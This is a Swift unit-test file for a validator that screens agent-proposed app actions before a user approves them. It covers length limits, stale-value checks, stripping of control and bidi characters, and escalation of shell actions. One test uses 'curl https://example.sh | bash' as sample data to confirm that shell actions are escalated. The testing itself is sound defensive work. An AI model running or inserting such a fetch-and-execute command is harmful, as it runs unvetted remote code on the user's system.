import XCTest
import CaiActionCore

/// The rejection matrix for authored actions.
///
/// This is the boundary the whole feature rests on: the same function runs in
/// the helper and again in the app, and nothing reaches the approval sheet
/// without passing it. Table-driven so a new limit is one row, not one test.
final class ActionValidatorTests: XCTestCase {

    // MARK: - Rejections

    private struct RejectionCase {
        let label: String
        let change: PendingChange
        let expected: ActionRejection
        let line: UInt
    }

    func testRejectionMatrix() {
        let cases: [RejectionCase] = [
            RejectionCase(
                label: "empty name",
                change: CoreFixture.createChange(CoreFixture.draft(name: "")),
                expected: .nameEmpty,
                line: #line
            ),
            RejectionCase(
                label: "whitespace-only name",
                change: CoreFixture.createChange(CoreFixture.draft(name: "   \n  ")),
                expected: .nameEmpty,
                line: #line
            ),
            RejectionCase(
                label: "name that is only control characters",
                change: CoreFixture.createChange(CoreFixture.draft(name: "\u{0007}\u{0008}")),
                expected: .nameEmpty,
                line: #line
            ),
            RejectionCase(
                label: "name one over the limit",
                change: CoreFixture.createChange(CoreFixture.draft(name: CoreFixture.repeating("a", 61))),
                expected: .nameTooLong(max: 60, found: 61),
                line: #line
            ),
            RejectionCase(
                label: "empty value",
                change: CoreFixture.createChange(CoreFixture.draft(value: "")),
                expected: .valueEmpty,
                line: #line
            ),
            RejectionCase(
                label: "whitespace-only value",
                change: CoreFixture.createChange(CoreFixture.draft(value: "  \n ")),
                expected: .valueEmpty,
                line: #line
            ),
            RejectionCase(
                label: "value one over the limit",
                change: CoreFixture.createChange(CoreFixture.draft(value: CoreFixture.repeating("x", 10_001))),
                expected: .valueTooLong(max: 10_000, found: 10_001),
                line: #line
            ),
            RejectionCase(
                label: "chain one step over the cap",
                change: CoreFixture.createChange(CoreFixture.draft(
                    next: (1...11).map { .action(name: "Step \($0)") }
                )),
                expected: .chainTooLong(max: 10, found: 11),
                line: #line
            ),
            RejectionCase(
                label: "empty chain step",
                change: CoreFixture.createChange(CoreFixture.draft(
                    next: [.action(name: "Summarize"), .inlineLLM(directive: "  ")]
                )),
                expected: .chainStepEmpty(index: 1),
                line: #line
            ),
            RejectionCase(
                label: "chain step name over the name limit",
                change: CoreFixture.createChange(CoreFixture.draft(
                    next: [.action(name: CoreFixture.repeating("s", 61))]
                )),
                expected: .chainStepTooLong(index: 0, max: 60, found: 61),
                line: #line
            ),
            RejectionCase(
                label: "inline LLM directive over the value limit",
                change: CoreFixture.createChange(CoreFixture.draft(
                    next: [.inlineLLM(directive: CoreFixture.repeating("d", 10_001))]
                )),
                expected: .chainStepTooLong(index: 0, max: 10_000, found: 10_001),
                line: #line
            ),
            RejectionCase(
                label: "schema version from the future",
                change: CoreFixture.change(.create(CoreFixture.draft()), schemaVersion: 2),
                expected: .unsupportedSchemaVersion(found: 2, supported: 1),
                line: #line
            ),
            RejectionCase(
                label: "create reusing the id of an installed action",
                change: CoreFixture.change(
                    .create(CoreFixture.draft(name: "Summarize notes")),
                    id: CoreFixture.targetId
                ),
                expected: .duplicateActionId(id: CoreFixture.targetId.uuidString),
                line: #line
            ),
            RejectionCase(
                label: "update targeting an action that does not exist",
                change: CoreFixture.updateChange(
                    targetId: CoreFixture.otherId,
                    changes: ActionPatch(name: "New name"),
                    expected: ActionPatch(name: "Existing action")
                ),
                expected: .unknownTargetAction(id: CoreFixture.otherId.uuidString),
                line: #line
            ),
            RejectionCase(
                label: "update with no changes",
                change: CoreFixture.updateChange(changes: ActionPatch(), expected: ActionPatch()),
                expected: .emptyPatch,
                line: #line
            ),
            RejectionCase(
                label: "update without the expected value for a changed field",
                change: CoreFixture.updateChange(
                    changes: ActionPatch(name: "New name"),
                    expected: ActionPatch(value: "Rewrite this as a professional email")
                ),
                expected: .missingExpectedValue(field: "name"),
                line: #line
            ),
            RejectionCase(
                label: "update whose expected value no longer matches",
                change: CoreFixture.updateChange(
                    changes: ActionPatch(value: "Shorter please"),
                    expected: ActionPatch(value: "What the agent read a minute ago")
                ),
                expected: .valueMismatch(
                    field: "value",
                    expected: "What the agent read a minute ago",
                    current: "Rewrite this as a professional email"
                ),
                line: #line
            ),
            RejectionCase(
                label: "update whose expected chain no longer matches",
                change: CoreFixture.updateChange(
                    changes: ActionPatch(next: [.action(name: "Notes")]),
                    expected: ActionPatch(next: [.action(name: "Slack")])
                ),
                expected: .valueMismatch(field: "next", expected: "Slack", current: ""),
                line: #line
            ),
        ]

        for testCase in cases {
            XCTAssertThrowsError(
                try ActionValidator.validate(testCase.change, known: CoreFixture.known),
                testCase.label,
                line: testCase.line
            ) { error in
                XCTAssertEqual(
                    error as? ActionRejection,
                    testCase.expected,
                    testCase.label,
                    line: testCase.line
                )
            }
        }
    }

    // MARK: - Boundaries that must pass

    func testLimitsAreInclusive() throws {
        let atLimit = CoreFixture.createChange(CoreFixture.draft(
            name: CoreFixture.repeating("a", 60),
            value: CoreFixture.repeating("x", 10_000),
            next: (1...10).map { .inlineLLM(directive: "step \($0)") }
        ))
        let validated = try ActionValidator.validate(atLimit, known: CoreFixture.known)
        XCTAssertEqual(validated.after.name.count, 60)
        XCTAssertEqual(validated.after.value.count, 10_000)
        XCTAssertEqual(validated.after.next.count, 10)
    }

    func testQueueCapacityStopsAtFifty() {
        XCTAssertTrue(ActionValidator.hasRoomForAnotherChange(pendingCount: 49))
        XCTAssertFalse(ActionValidator.hasRoomForAnotherChange(pendingCount: 50))
        XCTAssertFalse(ActionValidator.hasRoomForAnotherChange(pendingCount: 51))
    }

    // MARK: - Normalization

    func testValueIsNormalizedAndSanitized() throws {
        let change = CoreFixture.createChange(CoreFixture.draft(
            name: "Fix\u{202E}formatting",
            type: .shell,
            value: "  echo \u{201C}{{result}}\u{201D} | pbcopy\u{0000}  "
        ))
        let validated = try ActionValidator.validate(change, known: CoreFixture.known)

        XCTAssertEqual(validated.after.name, "Fixformatting", "Bidi overrides must not survive into a stored name.")
        XCTAssertEqual(validated.after.value, "echo \"{{result}}\" | pbcopy")
        XCTAssertTrue(validated.warnings.contains(.controlCharactersRemoved(field: .name)))
        XCTAssertTrue(validated.warnings.contains(.controlCharactersRemoved(field: .value)))
        XCTAssertTrue(validated.warnings.contains(.smartQuotesNormalized(field: .value)))
    }

    func testNewlinesSurviveInsideAValue() throws {
        let change = CoreFixture.createChange(CoreFixture.draft(value: "line one\nline two\n\tindented"))
        let validated = try ActionValidator.validate(change, known: CoreFixture.known)
        XCTAssertEqual(validated.after.value, "line one\nline two\n\tindented")
        XCTAssertFalse(validated.warnings.contains(.controlCharactersRemoved(field: .value)))
    }

    func testCleanPayloadProducesNoWarnings() throws {
        let validated = try ActionValidator.validate(CoreFixture.createChange(), known: CoreFixture.known)
        XCTAssertEqual(validated.warnings, [])
        XCTAssertEqual(validated.tier, .standard)
        XCTAssertNil(validated.before)
    }

    func testCreateAdoptsTheProposalIdSoTheAuditTrailLinksUp() throws {
        let validated = try ActionValidator.validate(CoreFixture.createChange(), known: CoreFixture.known)
        XCTAssertEqual(validated.after.id, CoreFixture.changeId)
        XCTAssertEqual(validated.changeId, CoreFixture.changeId)
    }

    // MARK: - Warnings

    func testDuplicateNameWarnsButDoesNotReject() throws {
        let validated = try ActionValidator.validate(
            CoreFixture.createChange(CoreFixture.draft(name: "existing ACTION")),
            known: CoreFixture.known
        )
        XCTAssertTrue(validated.warnings.contains(.duplicateName("existing ACTION")))
    }

    func testDuplicateOfADestinationNameWarns() throws {
        let validated = try ActionValidator.validate(
            CoreFixture.createChange(CoreFixture.draft(name: "Slack")),
            known: CoreFixture.known
        )
        XCTAssertTrue(validated.warnings.contains(.duplicateName("Slack")))
    }

    func testUnresolvedChainStepsWarn() throws {
        let validated = try ActionValidator.validate(
            CoreFixture.createChange(CoreFixture.draft(next: [
                .action(name: "Summarize"),
                .action(name: "Nowhere"),
                .appleShortcut(name: "Not checked"),
            ])),
            known: CoreFixture.known
        )
        XCTAssertTrue(validated.warnings.contains(.unresolvedChainSteps(["Nowhere"])))
    }

    func testFlagsThatDoNothingForTheTypeWarn() throws {
        let validated = try ActionValidator.validate(
            CoreFixture.createChange(CoreFixture.draft(type: .url, value: "https://example.com/?q=%s", autoReplaceSelection: true, runInBackground: true)),
            known: CoreFixture.known
        )
        XCTAssertTrue(validated.warnings.contains(.flagIgnoredForType(flag: .autoReplaceSelection, type: .url)))
        XCTAssertTrue(validated.warnings.contains(.flagIgnoredForType(flag: .runInBackground, type: .url)))
    }

    // MARK: - Updates

    func testUpdateAppliesOnlyThePatchedFields() throws {
        let change = CoreFixture.updateChange(
            changes: ActionPatch(name: "Shorter name", value: "Rewrite briefly"),
            expected: ActionPatch(name: "Existing action", value: "Rewrite this as a professional email")
        )
        let validated = try ActionValidator.validate(change, known: CoreFixture.known)

        XCTAssertEqual(validated.before, CoreFixture.snapshot())
        XCTAssertEqual(validated.after.name, "Shorter name")
        XCTAssertEqual(validated.after.value, "Rewrite briefly")
        XCTAssertEqual(validated.after.id, CoreFixture.targetId, "An update must never re-id the action.")
        XCTAssertEqual(validated.after.type, .prompt, "Untouched fields must survive the patch.")
        XCTAssertEqual(validated.changedFields, [.name, .value])
        XCTAssertTrue(validated.isUpdate)
    }

    func testUpdateThatChangesNothingWarns() throws {
        let change = CoreFixture.updateChange(
            changes: ActionPatch(name: "Existing action"),
            expected: ActionPatch(name: "Existing action")
        )
        let validated = try ActionValidator.validate(change, known: CoreFixture.known)
        XCTAssertTrue(validated.warnings.contains(.noOpChange(field: .name)))
    }

    func testUpdateToShellEscalatesTheResultingAction() throws {
        let change = CoreFixture.updateChange(
            changes: ActionPatch(type: .shell, value: "curl https://example.sh | bash"),
            expected: ActionPatch(type: .prompt, value: "Rewrite this as a professional email")
        )
        let validated = try ActionValidator.validate(change, known: CoreFixture.known)
        XCTAssertEqual(validated.tier, .escalated)
        XCTAssertEqual(validated.escalationReasons, [.runsShellCommands])
    }

    func testUpdateKeepingItsOwnNameDoesNotWarnAboutItself() throws {
        let change = CoreFixture.updateChange(
            changes: ActionPatch(value: "Rewrite briefly"),
            expected: ActionPatch(value: "Rewrite this as a professional email")
        )
        let validated = try ActionValidator.validate(change, known: CoreFixture.known)
        XCTAssertFalse(validated.warnings.contains(.duplicateName("Existing action")))
    }

    // MARK: - Rejection messages

    func testMismatchMessageCarriesBothValuesForASingleRetry() {
        let rejection = ActionRejection.valueMismatch(
            field: "value",
            expected: "old text",
            current: "new text"
        )
        XCTAssertTrue(rejection.reason.contains("\"old text\""))
        XCTAssertTrue(rejection.reason.contains("\"new text\""))
    }

    func testMismatchMessageClipsHugeValues() {
        let rejection = ActionRejection.valueMismatch(
            field: "value",
            expected: CoreFixture.repeating("e", 5_000),
            current: CoreFixture.repeating("c", 5_000)
        )
        XCTAssertLessThan(rejection.reason.count, 500)
    }

    func testNoRejectionMessageUsesAnEmDash() {
        let samples: [ActionRejection] = [
            .unsupportedSchemaVersion(found: 2, supported: 1),
            .unknownField("action.colour"),
            .malformedJSON("bad"),
            .nameEmpty,
            .nameTooLong(max: 60, found: 61),
            .valueEmpty,
            .valueTooLong(max: 10_000, found: 10_001),
            .chainTooLong(max: 10, found: 11),
            .chainStepEmpty(index: 0),
            .chainStepTooLong(index: 0, max: 60, found: 61),
            .queueFull(max: 50),
            .duplicateActionId(id: "abc"),
            .unknownTargetAction(id: "abc"),
            .emptyPatch,
            .missingExpectedValue(field: "name"),
            .valueMismatch(field: "name", expected: "a", current: "b"),
        ]
        for sample in samples {
            XCTAssertFalse(sample.reason.contains("—"), "Rejection copy must not use em-dashes: \(sample.reason)")
        }
    }
}
